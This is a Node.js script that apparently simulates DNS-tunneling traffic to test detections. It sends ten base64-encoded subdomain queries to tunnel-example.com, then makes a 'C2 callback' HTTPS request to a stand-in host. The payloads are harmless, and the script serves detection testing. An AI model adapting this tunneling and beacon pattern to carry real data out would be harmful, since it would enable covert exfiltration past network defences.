// dns_tunnel_sim.js
// Safe DNS-tunneling simulation for Garnet detections
// Generates many DNS requests + "tunnel-like" encoded strings

const dns = require("dns");
const https = require("https");

// Fake encoded chunks, similar to DNS tunneling queries (TXT-like)
function generateEncodedSubdomain(i) {
  const encoded = Buffer.from(`chunk_${i}_${Date.now()}`).toString("base64");
  return `${encoded}.tunnel-example.com`;
}

function dnsQuery(name) {
  return new Promise((resolve) => {
    dns.resolve4(name, (err) => {
      if (err) console.error("DNS error:", err.message);
      resolve();
    });
  });
}

function httpsFallback() {
  // If tunneling was exfiltrating data to a C2 server
  return new Promise((resolve) => {
    https
      .get("https://dns-tunnel.example.com/ping", (res) => {
        res.on("data", () => {});
        res.on("end", resolve);
      })
      .on("error", (err) => {
        console.error("HTTPS fallback error:", err.message);
        resolve();
      });
  });
}

async function runDNSTunnelSim() {
  console.log("Simulating DNS tunnel traffic…");

  // Simulate 10 encoded DNS queries
  for (let i = 0; i < 10; i++) {
    const domain = generateEncodedSubdomain(i);
    console.log("Querying:", domain);
    await dnsQuery(domain);
  }

  // Optional "C2 callback"
  await httpsFallback();

  console.log("dns_tunnel_sim complete.");
}

runDNSTunnelSim();
